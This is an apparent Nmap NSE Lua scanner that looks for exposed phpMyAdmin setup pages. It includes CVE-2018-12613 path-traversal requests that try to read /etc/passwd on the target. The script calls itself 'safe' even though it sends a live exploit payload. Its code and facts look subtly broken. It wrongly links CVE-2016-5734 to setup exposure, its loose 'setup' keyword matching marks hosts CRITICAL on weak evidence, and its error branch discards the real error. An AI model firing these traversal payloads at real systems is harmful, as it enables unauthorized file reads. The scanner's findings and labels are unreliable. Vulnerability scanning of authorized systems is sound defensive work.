local http = require "http"
local stdnse = require "stdnse"

description = [[Detects phpMyAdmin setup pages left accessible allowing arbitrary code execution (CVE-2018-12613, CVE-2016-5734).]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""

    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
    end

    local setups = {
      {path = "/phpmyadmin/setup/", label = "phpMyAdmin setup"},
      {path = "/phpMyAdmin/setup/", label = "phpMyAdmin setup (capitalized)"},
      {path = "/pma/setup/", label = "PMA setup"},
      {path = "/admin/phpmyadmin/setup/", label = "admin phpMyAdmin setup"},
      {path = "/mysql/setup/", label = "MySQL setup"},
      {path = "/phpmyadmin/scripts/setup.php", label = "setup.php script"},
      {path = "/pma/scripts/setup.php", label = "PMA setup.php"},
      {path = "/phpmyadmin/index.php?db=mysql&token=&table=&target=db_sql.php%253f/../../../../../../../../etc/passwd%23", label = "CVE-2018-12613 file inclusion"},
      {path = "/phpmyadmin/index.php?db=mysql&token=&table=&target=db_datadict.php%253f/../../../../../../../../etc/passwd%23", label = "CVE-2018-12613 alt vector"},
      {path = "/phpmyadmin/setup/index.php?page=servers", label = "Setup servers page"},
    }

    for _, s in ipairs(setups) do
      local req = http.get(host, port, s.path)
      if req and req.status then
        local body = req.body or ""
        if req.status == 200 then
          local pma_indicators = {"phpMyAdmin", "pma_password", "AllowNoPassword", "$cfg%[", "blowfish_secret", "setup", "phpmyadmin%-setup"}
          for _, ind in ipairs(pma_indicators) do
            if body:match(ind) then
              local excerpt = body:sub(1, 100):gsub("\n", " "):gsub("\r", "")
              table.insert(findings, {path = s.path, label = s.label, status = req.status, indicator = ind, excerpt = excerpt})
              break
            end
          end
          if body:match("username") and body:match("password") and body:match("server") then
            table.insert(findings, {path = s.path, label = s.label .. " (installer form)", status = req.status, indicator = "installer form", excerpt = "username/password/server fields present"})
          end
          if body:match("setup") and (body:match("Configure") or body:match("Install")) then
            table.insert(findings, {path = s.path, label = s.label, status = req.status, indicator = "setup page", excerpt = body:sub(1, 80)})
          end
          if s.path:match("etc/passwd") and body:match("root:.*:0:0:") then
            table.insert(findings, {path = s.path, label = "CVE-2018-12613 file inclusion", status = req.status, indicator = "LFI", excerpt = body:sub(1, 80)})
          end
        elseif req.status == 302 then
          local loc = req.headers and req.headers["location"]
          local loc_str = type(loc) == "table" and table.concat(loc, " ") or tostring(loc or "")
          if loc_str:match("setup") or loc_str:match("phpmyadmin") then
            table.insert(findings, {path = s.path, label = s.label, status = req.status, indicator = ("redirects to %s"):format(loc_str:sub(1, 60))})
          end
        end
      end
    end

    if #findings > 0 then
      local result = stdnse.output_table()
      result.cve = "CVE-2018-12613, CVE-2016-5734"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.server = server_banner
      result.detail = ("phpMyAdmin setup exposure confirmed via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("%s (%s) -> HTTP %d, matched: %s"):format(f.path, f.label, f.status, f.indicator)
      end
      return result
    end

    local result = stdnse.output_table()
    result.cve = "CVE-2018-12613"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.detail = "No phpMyAdmin setup exposure detected"
    return result
  end)
  if not ok then
    local result = stdnse.output_table()
    result.cve = "CVE-2018-12613"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
